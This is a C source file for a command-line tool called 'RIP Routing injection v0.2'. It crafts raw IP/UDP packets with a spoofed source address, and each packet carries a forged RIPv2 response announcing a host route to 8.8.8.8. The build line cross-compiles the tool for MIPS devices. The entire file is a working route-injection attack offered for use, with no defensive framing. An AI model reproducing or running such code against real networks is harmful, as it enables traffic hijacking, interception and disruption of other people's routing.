/*
	Raw UDP sockets: inyeccion de rutas rip; para compilar en bsd/osx usa -DBSD
	mips-linux-gnu-gcc --static -s -mips32 --sysroot=mips-sysroot ripinj.c -o ripinj
*/

#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <errno.h>

#include <netinet/in.h>
#include <netinet/udp.h>
#include <netinet/ip.h>


// --------------------
// config 
// --------------------

#define PORT_SRC 520
#define PORT_DST 520


// ----------------
// ripv response: inyectar ruta 8.8.8.8/32 (metrica 2)
// ----------------
const unsigned char RIP[] =
{
	// rip header 
        0x02,                           // command = response
        0x02,                           // version = 2
        0x00, 0x00,                     // 0
        
        // rip entry table
        0x00, 0x02,                     // address family = 2 (ip)
        0x00, 0x00,                     // route tag = 0
        0x08, 0x08, 0x08, 0x08,         // ip address
        0xff, 0xff, 0xff, 0xff,         // subnet mask
        0x00, 0x00, 0x00, 0x00,         // next hop
        0x00, 0x00, 0x00, 0x02          // metric
};      


// 96 bit (12 bytes) pseudo header needed for udp header checksum calculation 
struct pseudo_header
{
	u_int32_t source_address;
	u_int32_t dest_address;
	u_int8_t placeholder;
	u_int8_t protocol;
	u_int16_t udp_length;
};
 

// ----------------------------------------------
// Generic checksum calculation function
// ----------------------------------------------
unsigned short csum(unsigned short *ptr,int nbytes) 
{
	register long sum = 0;
	unsigned short oddbyte;
	register short answer;
 
	while(nbytes > 1)
	{
		sum += *ptr++;
		nbytes -= 2;
	}

	if(nbytes == 1) 
	{
		oddbyte = 0;
		*((u_char *) &oddbyte) = *(u_char *) ptr;
		sum += oddbyte;
	}
 
	sum = (sum >> 16) + (sum & 0xffff);
	sum = sum + (sum >> 16);
     
	return ((short) ~sum);
}
 

// ----------------------------------------------
// main
// ----------------------------------------------
int main(int argc, char *argv[])
{
	int s, sz, hincl = 1;
	char datagram[4096], source_ip[16], dest_ip[16], *data, *pseudogram, sbuf[256];;
	struct sockaddr_in sin;
	struct pseudo_header psh;

	// cabecera ip 
#ifdef BSD
	struct ip *iph = (struct ip *) datagram;
#else
	struct iphdr *iph = (struct iphdr *) datagram;
#endif

	// cabecera udp
	struct udphdr *udph = (struct udphdr *) (datagram + sizeof (struct ip));;

	// banner
	printf("RIP Routing injection v0.2\n");

        // usage
        if (argc < 3)
        {
                printf("Usage: %s <source ip> <dest ip>\n\n", argv[0]);
                exit(1);
        }

        // variables
        strncpy(source_ip, argv[1], sizeof(source_ip));
        strncpy(dest_ip, argv[2], sizeof(dest_ip));

	// Create a raw socket of type IPPROTO
	if ((s = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
	{
		perror("Failed to create raw socket");
		exit(1);
	}

#ifdef BSD
	// necesario para bsd, por defecto no pone IP_HDRINCL = 1 cuando RAWIP ...
	setsockopt(s, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));
#endif

	//zero out the packet buffer
	memset(datagram, 0, sizeof(datagram));
     
	//Data part
#ifdef BSD
	data = datagram + sizeof(struct ip) + sizeof(struct udphdr);
#else
	data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);
#endif
	memcpy(data , RIP, sizeof(RIP));
     
	// no es necesario configurar
	sin.sin_family = AF_INET;
	sin.sin_port = 0;
	// sin.sin_addr.s_addr = inet_addr(IP_DST);
	sin.sin_addr.s_addr = inet_addr(dest_ip);
     
#ifdef BSD
	// Fill in the IP Header
	iph->ip_hl = 5;
	iph->ip_v = 4;
	iph->ip_tos = 0;
	iph->ip_len = sz = sizeof(struct ip) + sizeof(struct udphdr) + sizeof(RIP);
	iph->ip_id = htonl(54321); //Id of this packet
	iph->ip_off = 0;
	iph->ip_ttl = 255;
	iph->ip_p = IPPROTO_UDP;
	iph->ip_sum = 0;      //Set to 0 before calculating checksum
	iph->ip_src.s_addr = inet_addr(source_ip);    //Spoof the source ip address
	iph->ip_dst.s_addr = sin.sin_addr.s_addr;

	// Ip checksum
	iph->ip_sum = csum((unsigned short *) datagram, iph->ip_len);

 	// UDP header
 	udph->uh_sport = htons(PORT_SRC);
 	udph->uh_dport = htons(PORT_DST);
 	udph->uh_ulen = htons(8 + sizeof(RIP)); //tcp header size
 	udph->uh_sum = 0; //leave checksum 0 now, filled later by pseudo header
#else
	// Fill in the IP Header
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sz = sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(RIP);
	iph->id = htonl(54321); //Id of this packet
	iph->frag_off = 0;
	iph->ttl = 255;
	iph->protocol = IPPROTO_UDP;
	iph->check = 0;      //Set to 0 before calculating checksum
	iph->saddr = inet_addr(source_ip);    //Spoof the source ip address
	iph->daddr = sin.sin_addr.s_addr;
     
	// Ip checksum
	iph->check = csum((unsigned short *) datagram, iph->tot_len);
     
	// UDP header
	udph->source = htons(PORT_SRC);
	udph->dest = htons(PORT_DST);
	udph->len = htons(8 + sizeof(RIP)); //tcp header size
	udph->check = 0; //leave checksum 0 now, filled later by pseudo header
#endif
     
	// Now the UDP checksum using the pseudo header
	psh.source_address = inet_addr(source_ip);
	psh.dest_address = sin.sin_addr.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_UDP;
	psh.udp_length = htons(sizeof(struct udphdr) + sizeof(RIP) );
     
    	int psize = sizeof(struct pseudo_header) + sizeof(struct udphdr) + sizeof(RIP);
    	pseudogram = malloc(psize);
     
	memcpy(pseudogram, (char*) &psh, sizeof(struct pseudo_header));
	memcpy(pseudogram + sizeof(struct pseudo_header), udph, sizeof(struct udphdr) + sizeof(RIP));
     
#ifdef BSD
	udph->uh_sum = csum((unsigned short*) pseudogram, psize);
#else
	udph->check = csum((unsigned short*) pseudogram, psize);
#endif

	printf("Sending UDP packet...\n");
     
        // Send the packet
	if (sendto(s, datagram, sz,  0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
		perror("Error!");

        // Data send successfully
        else printf("Done: packet length: %d\n", sz);

	return 0;
}
